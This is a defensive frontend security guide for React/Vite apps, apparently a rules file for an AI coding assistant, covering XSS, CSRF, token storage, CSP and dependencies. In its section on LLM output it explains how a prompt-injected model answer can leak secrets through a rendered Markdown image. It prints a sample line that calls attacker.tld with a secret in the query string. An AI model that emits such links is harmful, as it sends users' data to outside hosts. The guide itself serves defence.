# Frontend security

Browser-side security rules for the SPA and React Router framework mode. ASVS 5.0
requirement ids in brackets. The frontend never enforces authorization — it only hides
what the user can't use; the backend decides [8.3.1].

## 1. Rendering untrusted content (XSS)

React escapes text in JSX. XSS enters through the escape hatches.

- **No `dangerouslySetInnerHTML`** unless the HTML is sanitized with DOMPurify right at
  the point of use [1.3.1]. Wrap it in one shared component so every use is reviewed in
  one place. Whenever a new use appears, point it out to the user — it stays a risk
  even with DOMPurify.

```tsx
// shared/ui/sanitized-html/SanitizedHtml.tsx
import DOMPurify from 'dompurify'

export function SanitizedHtml({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

- Outside React (refs, third-party widgets), set text with `textContent`, never
  `innerHTML`/`outerHTML`/`insertAdjacentHTML` [3.2.2].
- **URLs from data** (`href`, `src`, `action`, `formAction`): allow only `https:`
  (plus `mailto:`/`tel:` where intended) and same-origin relative paths. Reject
  `javascript:`, `data:`, `vbscript:` [1.2.2]. Build URLs with `new URL()` /
  `URLSearchParams`, never by string concatenation.

```ts
export function safeHref(raw: string): string | undefined {
  try {
    const url = new URL(raw, window.location.origin)
    return ['https:', 'mailto:'].includes(url.protocol) ? url.href : undefined
  } catch {
    return undefined // invalid URL → render as plain text, no link
  }
}
```

- No `eval`, `new Function`, `setTimeout('string')` [1.3.2]. User-supplied SVG is
  sanitized (DOMPurify with the `svg` profile) or shown via `<img>`, never inlined
  [1.3.4].
- **DOM clobbering** [3.2.3]: don't read globals that HTML could define
  (`window.config`, `document.someId`); declare variables explicitly, check types
  (`instanceof HTMLElement`) before use. Sanitized HTML must not be able to set `id`/
  `name` values your code looks up (DOMPurify's `SANITIZE_NAMED_PROPS: true`).
- DOMPurify 3 ships its own types — don't add `@types/dompurify`. Links with
  `target="_blank"` in sanitized HTML get `rel="noopener noreferrer"` via an
  `afterSanitizeAttributes` hook registered once in the wrapper module.

## 2. Rendering LLM output and Markdown

Treat model output and user Markdown as untrusted input [1.3.5].

- **Never render model output as HTML.** Render Markdown with a renderer that does not
  pass raw HTML through: `react-markdown` (v10) shows raw HTML as escaped text unless
  `rehype-raw` is added — don't add it (or set `skipHtml` to drop HTML entirely). If a
  plugin must produce HTML, put `rehype-sanitize` **last** in `rehypePlugins`.
- `react-markdown`'s default `urlTransform` already drops `javascript:`/`data:` URLs;
  restrict further with `allowedElements` (e.g. no `img`) and custom `a`/`img`
  `components`.
- **Links and images are exfiltration channels**: a prompt-injected answer can render
  `![](https://attacker.tld/?q=<secret>)` and leak data on load. Mitigate in two layers:
  - Renderer: allow links/images only from an allowlist of hosts (custom `urlTransform`
    or custom `a`/`img` components); render other images as plain links or text;
    links get `rel="noopener noreferrer"` and show the target host.
  - CSP: a tight `img-src` / `connect-src` (only own origins and named CDNs) blocks
    loading even if the renderer misses a case.
- Actions (tool calls) triggered by model output run only after explicit user
  confirmation that shows exactly what will happen (target, parameters).
- Streamed output is sanitized/rendered the same way as the final output.

## 3. Tokens, sessions and storage

- **No tokens in `localStorage`, `sessionStorage` or IndexedDB** [14.3.3]. Any XSS can
  read them. The browser holds a **session cookie** set by the backend: `HttpOnly`,
  `Secure`, `SameSite=Lax|Strict`, `__Host-` prefix [3.3.1–3.3.4]. JavaScript never sees
  the session value.
- **OIDC**: prefer a backend-for-frontend — the backend runs the Authorization Code
  flow with PKCE and keeps access/refresh tokens; the browser only gets the session
  cookie [10.1.1]. A pure browser OIDC client is the exception and needs an explicit
  project decision (tokens in memory only, PKCE, `state`, `nonce`) [10.1.2, 10.2.1].
- No sensitive data in browser storage at all — persisted Zustand state holds
  preferences (theme, column layout), not personal data, tokens or permissions
  [14.3.3].
- No secrets or personal data in URLs (query strings end up in logs, history, Referer)
  [14.2.1]. Set `Referrer-Policy: strict-origin-when-cross-origin` (or stricter) [3.4.5].

## 4. Requests to the backend

- One API client in `shared/api`. Every request goes through it — a direct `fetch`/Axios
  call in a hook or component skips the CSRF header, error mapping, 401 handling and
  logging.
- **`credentials: 'include'` only for requests to the own API origin**, never for
  third-party URLs. Same-origin deployments (`/api` behind the same host) need only the
  default `same-origin`.
- **CSRF**: every state-changing request (`POST`, `PUT`, `PATCH`, `DELETE`) sends the
  CSRF header the backend expects (e.g. `X-CSRF-Token` with the value of the readable
  CSRF cookie or the token from the session endpoint) and a JSON `Content-Type`
  [3.5.1–3.5.3]. Never change state with `GET`.

```ts
// shared/api/client.ts
const UNSAFE_METHODS = new Set(['POST', 'PUT', 'PATCH', 'DELETE'])

export async function apiFetch(path: string, init: RequestInit = {}): Promise<Response> {
  const method = (init.method ?? 'GET').toUpperCase()
  const headers = new Headers(init.headers)
  headers.set('Accept', 'application/json')
  if (UNSAFE_METHODS.has(method)) headers.set('X-CSRF-Token', readCsrfToken())
  const response = await fetch(`${API_BASE_PATH}${path}`, {
    ...init,
    method,
    headers,
    credentials: 'include', // own API only
  })
  if (!response.ok) throw await toApiError(response) // never swallow
  return response
}
```

- **Validate responses at the boundary** with Zod before the data enters the Query
  cache (`data-and-state.md`). Unknown shapes fail loudly.
- Show generic error messages to users; log details (without personal data or tokens)
  to the error-tracking tool [16.5.1]. Login and recovery errors reveal nothing about
  which part was wrong ("Invalid credentials", not "Email not found" / "Password
  incorrect"). Never show stack traces; show a request/correlation id the user can
  quote instead.
- `401` → clear client state and go to login (see logout). `403` → "no permission"
  view; don't retry.

### CORS and the dev server

- Prefer one origin (`/api` behind the same host) — then no CORS is needed. In
  development, use the Vite dev-server `server.proxy` for `/api` so the browser sees the
  same origin as in production.
- If frontend and backend must live on different origins, the backend allows an
  explicit origin allowlist with credentials — never `*` — and only the methods and
  headers it needs.

## 5. Logout clears everything [14.3.1, 7.4.1]

1. Call the backend logout endpoint — the session is invalidated server-side.
2. `queryClient.clear()` — removes all cached server data.
3. Reset every Zustand store to its initial state and call
   `useStore.persist.clearStorage()` for persisted stores.
4. Hard navigation to the login page (`window.location.assign('/login')`) when in doubt
   — it drops all in-memory state.
5. The backend may additionally send `Clear-Site-Data: "cache", "storage"` on logout.

The client clears its state even when the logout request fails (offline, 5xx).
Every authenticated page has a visible logout control [7.4.4].

## 6. Redirects and navigation

- **Open redirect** [3.7.2]: a `?redirect=` / `returnTo` parameter is followed only if it
  is a same-origin relative path. Otherwise fall back to the home page.

```ts
export function safeRedirectTarget(raw: string | null | undefined): string {
  if (!raw || !raw.startsWith('/') || raw.startsWith('//') || raw.startsWith('/\\')) return '/'
  const url = new URL(raw, window.location.origin)
  return url.origin === window.location.origin ? url.pathname + url.search + url.hash : '/'
}
```

- External links opened in a new tab use `rel="noopener noreferrer"`.
- Navigation to external domains from user/model content shows the target host; for
  high-risk apps confirm before leaving [3.7.3].

## 7. Content Security Policy and headers

Set security headers as **HTTP response headers** at the server/reverse proxy that
serves the frontend (or in React Router framework mode, in the server's document
response). A `<meta http-equiv>` CSP ignores `frame-ancestors`, `report-to`/`report-uri`
and `sandbox` — use it only as an additional layer.

Baseline for a Vite SPA (adjust origins; no inline scripts):

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  font-src 'self';
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  report-to csp-endpoint
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Cross-Origin-Opener-Policy: same-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

- Required: `object-src 'none'`, `base-uri 'none'`, `frame-ancestors` [3.4.3, 3.4.6];
  HSTS ≥ 1 year [3.4.1]; `nosniff` [3.4.4]; a violation report endpoint [3.4.7].
- No `'unsafe-inline'`/`'unsafe-eval'` in `script-src`. Inline scripts (theme script,
  React Router's hydration scripts) are allowed by **hash or nonce**.
- React Router framework only: generate a fresh random nonce per request in
  `entry.server.tsx` (`react-router reveal` creates the file), pass it to
  `<ServerRouter nonce={nonce}>` (forwarded to `<Scripts>`, `<ScrollRestoration>`,
  `<Links>`) and to the `nonce` option of the React stream renderer, and set the CSP
  header with the same nonce via `responseHeaders.set(...)` in `handleRequest` (or in
  server `middleware`).
- Optional hardening for high-risk apps: Trusted Types
  (`require-trusted-types-for 'script'`), which React ≥ 19.3 integrates with; the
  DOMPurify wrapper then returns trusted HTML (`RETURN_TRUSTED_TYPE: true`). Roll out in
  report-only mode first.
- `index.html` and the SSR document are served with `Cache-Control: no-cache`; hashed
  assets with long-lived caching. Responses with personal data: `Cache-Control:
  no-store` [14.3.2].
- Third-party scripts from CDNs only with Subresource Integrity (`integrity` +
  `crossorigin`) or self-hosted [3.6.1].

## 8. Environment variables and build output

- **Every `VITE_*` variable is public** — it is inlined into the JavaScript bundle at
  build time. Never put secrets, API keys with write access, or internal URLs there.
  Secrets belong to the backend.
- Validate `import.meta.env` once with Zod in `shared/config/env.ts`; the app fails at
  startup on missing/invalid config.
- **Remove `console.*` and `debugger` from production builds** via the bundler/minifier
  configuration (see below) — not via regex scripts. Errors go to the error-tracking tool
  instead.
- Source maps: either not deployed publicly or uploaded only to the error-tracking
  service (`build.sourcemap: 'hidden'`). No dev tools (Query Devtools, mock workers,
  debug routes) in production bundles [15.2.3, 13.4.2].

```ts
// vite.config.ts — Vite 8 (Rolldown + Oxc minifier)
export default defineConfig({
  build: {
    sourcemap: 'hidden',
    rolldownOptions: {
      output: {
        minify: { compress: { dropConsole: true, dropDebugger: true }, mangle: true },
      },
    },
  },
})
```

The former `esbuild: { drop: ['console'] }` is silently ignored by Vite 8. On Vite ≤ 7
use `esbuild.drop` instead. Lint against stray `console` calls with Biome
`noConsole` (allow `console.error`/`console.warn` if the project wants them in
development).

## 9. JavaScript pitfalls

- **Prototype pollution** [15.3.6]: never deep-merge or `Object.assign` untrusted objects
  into config/state; skip `__proto__`, `constructor`, `prototype` keys. Use `Map`/`Set`
  for dictionaries keyed by user input, or `Object.create(null)`. Parse untrusted JSON
  into a Zod schema (unknown keys stripped) instead of spreading it.
- **Strict comparisons** [15.3.5]: `===` only; no type juggling in permission or
  feature checks.
- **`postMessage`** [3.5.5]: always check `event.origin` against an allowlist and
  validate `event.data` with a schema; when sending, use an explicit `targetOrigin`,
  never `'*'`.

```ts
window.addEventListener('message', (event) => {
  if (!TRUSTED_ORIGINS.has(event.origin)) return
  const result = widgetMessageSchema.safeParse(event.data)
  if (!result.success) return
  handleWidgetMessage(result.data)
})
```

- **ReDoS** [1.3.12]: no user-controlled regex; validate input length before applying
  complex patterns; escape user text used inside `new RegExp` [1.2.9].
- **CSV/spreadsheet export** generated in the browser: prefix cells starting with `=`,
  `+`, `-`, `@`, tab or NUL with `'` [1.2.10].
- **Iframes** for third-party content: `sandbox` with the minimum permissions; never
  `allow-scripts` together with `allow-same-origin` for untrusted content.

## 10. Dependencies

- Lockfile committed; installs in CI use the frozen lockfile. Dependencies are pinned to
  exact versions (`save-exact=true`, no `^`/`~` ranges).
- SAST in CI (e.g. `semgrep`) next to Biome's security rules.
- `audit` of the package manager (or `osv-scanner`) runs in CI; high/critical findings
  block the merge unless documented as not reachable [15.2.1].
- New dependencies need a reason: maintained, widely used, typed, no install scripts
  without need. Prefer the platform (`fetch`, `Intl`, `URL`, `structuredClone`) over
  small utility packages.
- Packages come only from the expected registry; scoped internal packages are bound to
  the internal registry to prevent dependency confusion [15.2.4].
- Remove unused dependencies (e.g. with `knip`).

## After writing

For a broader security review of a change (OWASP ASVS based), use the `appsec-review`
skill.
